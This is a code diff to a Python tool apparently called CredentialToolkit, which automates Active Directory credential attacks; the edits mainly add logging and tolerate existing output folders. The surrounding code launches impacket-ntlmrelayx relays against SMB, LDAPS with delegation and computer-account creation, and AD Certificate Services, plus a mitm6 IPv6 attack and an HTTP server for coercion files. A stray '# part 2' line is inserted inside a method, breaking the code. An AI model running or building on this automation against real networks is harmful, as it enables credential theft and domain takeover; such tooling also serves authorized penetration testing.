@@ -69,6 +69,7 @@ class AuditTrail:
             self.audit_file.write_text(json.dumps(audit_data, indent=2))
         except Exception as e:
             logger.error(f"Error saving audit trail: {str(e)}")
+            logger.exception("Exception occurred")
 
 def check_dependencies():
     """Check if required tools are installed"""
@@ -159,10 +160,10 @@ class CredentialToolkit:
             self.output_dir.mkdir(parents=True, exist_ok=True)
             
             # Create subdirectories
-            (self.output_dir / 'hashes').mkdir()
-            (self.output_dir / 'relay').mkdir()
-            (self.output_dir / 'adcs').mkdir()
-            (self.output_dir / 'logs').mkdir()
+            (self.output_dir / 'hashes').mkdir(exist_ok=True)
+            (self.output_dir / 'relay').mkdir(exist_ok=True)
+            (self.output_dir / 'adcs').mkdir(exist_ok=True)
+            (self.output_dir / 'logs').mkdir(exist_ok=True)
             
             # Symlink Responder logs
             responder_logs = Path('/usr/share/responder/logs')
@@ -173,6 +174,7 @@ class CredentialToolkit:
             
         except Exception as e:
             self.print_bad(f"Error setting up output directory: {str(e)}")
+            logger.error(f"Error setting up output directory: {str(e)}")
             return False
 
     def get_default_interface(self):
@@ -384,6 +386,7 @@ class CredentialToolkit:
             server_thread.daemon = True
             server_thread.start()
             
+# part 2
             self.print_good(f"Started HTTP server on port {self.args.port}")
             self.audit.add_event('http_server_started', {
                 'port': self.args.port,
@@ -545,17 +548,22 @@ class CredentialToolkit:
                 ntlmrelay_smb = self.run_command(
                     'impacket-ntlmrelayx -tf targets.txt -smb2support -socks -no-http-server -no-smb-server'
                 )
+                logger.info("Started SMB relay with SOCKS")
                 
                 if self.args.dc_ip:
                     # LDAPS relay for delegation
                     ntlmrelay_ldaps = self.run_command(
                         f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access'
                     )
+                    logger.info("Started LDAPS relay for delegation")
                     
                     # ADCS relay
                     ntlmrelay_adcs = self.run_command(
                         f'impacket-ntlmrelayx -t http://{self.args.dc_ip}/certsrv/certfnsh.asp'
                     )
+                    logger.info("Started ADCS relay")
+            else:
+                logger.warning("No relay targets found. Skipping relay attacks.")
             
             # 5. Start IPv6 attack if domain specified
             if self.args.domain:
@@ -567,6 +575,7 @@ class CredentialToolkit:
                     ntlmrelay_mitm6 = self.run_command(
                         f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access --add-computer'
                     )
+                    logger.info("Started LDAPS relay for mitm6")
             
             self.print_info("Attack infrastructure deployed - Monitoring for captures/relays")
             self.print_info(f"Coercion files available at: http://{self.local_ip}:{self.args.port}/")
@@ -592,6 +601,7 @@ class CredentialToolkit:
                 
         except Exception as e:
             self.print_bad(f"Error in auto_attack: {str(e)}")
+            logger.exception("Exception occurred in auto_attack")
             self.audit.add_event('error', {
                 'phase': 'auto_attack',
                 'error': str(e)
